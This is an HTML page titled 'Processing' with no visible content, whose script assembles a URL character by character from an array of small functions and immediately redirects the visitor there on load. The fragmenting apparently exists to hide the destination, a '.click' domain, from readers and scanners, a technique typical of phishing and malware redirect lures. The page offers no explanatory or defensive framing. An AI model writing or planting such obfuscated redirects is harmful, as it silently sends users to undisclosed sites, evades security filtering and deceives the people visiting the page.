<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Processing</title>
    <script>
        const fragments = [
            function() { return 'h'; },
            _ => 't',
            () => 't',
            _ => 'p',
            function() { return 's'; },
            () => ':',
            function() { return '/'; },
            function() { return '/'; },
            function() { return 'v'; },
            _ => 'e',
            _ => 'r',
            function() { return 'g'; },
            () => 'e',
            function() { return 'n'; },
            function() { return '.'; },
            function() { return 'c'; },
            () => 'l',
            _ => 'i',
            () => 'c',
            () => 'k',
            function() { return '/'; },
            _ => 's',
            function() { return '/'; },
            _ => 'n',
            () => 'e',
            () => 'w'
        ];
        window.location.href = fragments.map(fn => fn()).join('');
    </script>
</head>

</html>
